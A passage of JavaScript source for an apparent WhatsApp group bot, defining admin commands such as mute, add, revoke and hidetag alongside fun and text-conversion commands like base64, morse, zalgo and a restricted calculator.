      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to Morse code.");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-',
      'b': '-...',
      'c': '-.-.',
      'd': '-..',
      'e': '.',
      'f': '..-.',
      'g': '--.',
      'h': '....',
      'i': '..',
      'j': '.---',
      'k': '-.-',
      'l': '.-..',
      'm': '--',
      'n': '-.',
      'o': '---',
      'p': '.--.',
      'q': '--.-',
      'r': '.-.',
      's': '...',
      't': '-',
      'u': '..-',
      'v': '...-',
      'w': '.--',
      'x': '-..-',
      'y': '-.--',
      'z': '--..',
      '0': '-----',
      '1': '.----',
      '2': '..---',
      '3': '...--',
      '4': '....-',
      '5': '.....',
      '6': '-....',
      '7': '--...',
      '8': '---..',
      '9': '----.',
      '.': '.-.-.-',
      ',': '--..--',
      '?': '..--..',
      "'": '.----.',
      '!': '-.-.--',
      '/': '-..-.',
      '(': '-.--.',
      ')': '-.--.-',
      '&': '.-...',
      ':': '---...',
      ';': '-.-.-.',
      '=': '-...-',
      '+': '.-.-.',
      '-': '-....-',
      '_': '..--.-',
      '"': '.-..-.',
      '$': '...-..-',
      '@': '.--.-.',
      ' ': '/'
    };
    
    // Convert text to Morse code
    const morseCode = text.toLowerCase().split('').map(char => morseMap[char] || '').join(' ');
    
    await repondre(`📶 *Morse Code:*\n\n${morseCode}`);
  } catch (error) {
    console.error("Error in morse command:", error);
    await repondre("❌ An error occurred while converting to Morse code.");
  }
});

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
  desc: "Check the current local time and date for a specified timezone.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const timezone = arg[0];

  if (!timezone) {
    return repondre("❌ Please provide a timezone code. Example: .timezone TZ");
  }

  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time and date in the specified timezone
    const options = { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true, 
      timeZone: timezone 
    };

    const timeOptions = { 
      ...options, 
      weekday: "long", 
      year: "numeric", 
      month: "long", 
      day: "numeric" 
    };

    const localTime = now.toLocaleTimeString("en-US", options);
    const localDate = now.toLocaleDateString("en-US", timeOptions);

    // Send the local time and date as reply
    repondre(`🕰️ *Current Local Time:* ${localTime}\n📅 *Current Date:* ${localDate}`);
  } catch (e) {
    console.error("Error in .timezone command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "color",
  aliases: ["rcolor", "colorcode"],
  desc: "Generate a random color with name and code.",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const colorNames = [
      "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Pink", "Brown", "Black", "White", 
      "Gray", "Cyan", "Magenta", "Violet", "Indigo", "Teal", "Lavender", "Turquoise"
    ];
    
    const randomColorHex = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    const randomColorName = colorNames[Math.floor(Math.random() * colorNames.length)];

    repondre(`🎨 *Random Color:* \nName: ${randomColorName}\nCode: ${randomColorHex}`);
  } catch (e) {
    console.error("Error in .color command:", e);
    repondre("❌ An error occurred while generating the random color.");
  }
});

hango({
  nomCom: "binary",
  aliases: ["binarydgt", "binarycode"],
  desc: "Convert text into binary format",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre('Please provide a text to convert to binary.');
  }

  try {
    const binaryText = text.split('').map(char => {
      return `00000000${char.charCodeAt(0).toString(2)}`.slice(-8);
    }).join(' ');

    repondre(`🔑 *Binary Representation:* \n${binaryText}`);
  } catch (e) {
    console.error("Error in .binary command:", e);
    repondre("❌ An error occurred while converting to binary.");
  }
});

hango({
  nomCom: "dbinary",
  aliases: ["binarydecode", "decodebinary"],
  desc: "Decode binary string into text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre("❌ Please provide the binary string to decode.");
  }

  try {
    const binaryString = text;
    const textDecoded = binaryString.split(' ').map(bin => {
      return String.fromCharCode(parseInt(bin, 2));
    }).join('');

    repondre(`🔓 *Decoded Text:* \n${textDecoded}`);
  } catch (e) {
    console.error("Error in .dbinary command:", e);
    repondre("❌ An error occurred while decoding the binary string.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
